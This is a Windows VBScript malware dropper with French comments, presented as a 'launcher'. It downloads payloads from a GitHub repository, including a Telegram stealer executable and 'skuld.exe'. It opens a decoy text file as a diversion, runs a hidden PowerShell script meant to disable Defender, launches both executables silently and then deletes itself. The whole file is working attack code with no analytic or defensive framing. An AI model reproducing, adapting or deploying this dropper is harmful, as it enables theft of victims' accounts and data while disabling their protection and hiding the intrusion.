' launcher.vbs - Lanceur complet pour les fichiers du dépôt A993DEV/Q
On Error Resume Next

Dim shell, fso, winHttp, url, path, folder, disableUrl, disablePath, exeUrl, exePath, skuldUrl, skuldPath, saudiUrl, saudiPath

Set shell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")
Set winHttp = CreateObject("WinHttp.WinHttpRequest.5.1")

' === 1. DOSSIER CIBLE ===
folder = "C:\Users\Public\System"
If Not fso.FolderExists(folder) Then
    fso.CreateFolder(folder)
End If

' === 2. TÉLÉCHARGER SAUDI.TXT (diversion) ===
saudiUrl = "https://raw.githubusercontent.com/A993DEV/Q/main/Saudi.txt"
saudiPath = folder & "\Saudi.txt"

winHttp.Open "GET", saudiUrl, False
winHttp.Send
If winHttp.Status = 200 Then
    Dim stream
    Set stream = CreateObject("ADODB.Stream")
    stream.Type = 2
    stream.Charset = "utf-8"
    stream.Open
    stream.WriteText winHttp.ResponseText
    stream.SaveToFile saudiPath, 2
    stream.Close
End If

' === 3. TÉLÉCHARGER DISABLE.PS1 ===
disableUrl = "https://raw.githubusercontent.com/A993DEV/Q/main/disable.ps1"
disablePath = folder & "\disable.ps1"

Set winHttp = CreateObject("WinHttp.WinHttpRequest.5.1")
winHttp.Open "GET", disableUrl, False
winHttp.Send
If winHttp.Status = 200 Then
    Set stream = CreateObject("ADODB.Stream")
    stream.Type = 2
    stream.Charset = "utf-8"
    stream.Open
    stream.WriteText winHttp.ResponseText
    stream.SaveToFile disablePath, 2
    stream.Close
End If

' === 4. TÉLÉCHARGER A.EXE (Telegram Stealer) ===
exeUrl = "https://raw.githubusercontent.com/A993DEV/Q/main/A.exe"
exePath = folder & "\A.exe"

Set winHttp = CreateObject("WinHttp.WinHttpRequest.5.1")
winHttp.Open "GET", exeUrl, False
winHttp.Send
If winHttp.Status = 200 Then
    Set stream = CreateObject("ADODB.Stream")
    stream.Type = 1
    stream.Open
    stream.Write winHttp.ResponseBody
    stream.SaveToFile exePath, 2
    stream.Close
End If

' === 5. TÉLÉCHARGER SKULD.EXE ===
skuldUrl = "https://raw.githubusercontent.com/A993DEV/Q/main/skuld.exe"
skuldPath = folder & "\skuld.exe"

Set winHttp = CreateObject("WinHttp.WinHttpRequest.5.1")
winHttp.Open "GET", skuldUrl, False
winHttp.Send
If winHttp.Status = 200 Then
    Set stream = CreateObject("ADODB.Stream")
    stream.Type = 1
    stream.Open
    stream.Write winHttp.ResponseBody
    stream.SaveToFile skuldPath, 2
    stream.Close
End If

' === 6. OUVRIR SAUDI.TXT (diversion) ===
shell.Run "notepad.exe """ & saudiPath & """", 1, False

' === 7. EXÉCUTER DISABLE.PS1 (désactiver Defender) ===
shell.Run "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File """ & disablePath & """", 0, False

' === 8. ATTENDRE 5 SECONDES ===
WScript.Sleep 5000

' === 9. LANCER A.EXE ===
shell.Run exePath, 0, False

' === 10. LANCER SKULD.EXE ===
shell.Run skuldPath, 0, False

' === 11. AUTO-SUPPRESSION ===
WScript.Sleep 10000
fso.DeleteFile WScript.ScriptFullName, True
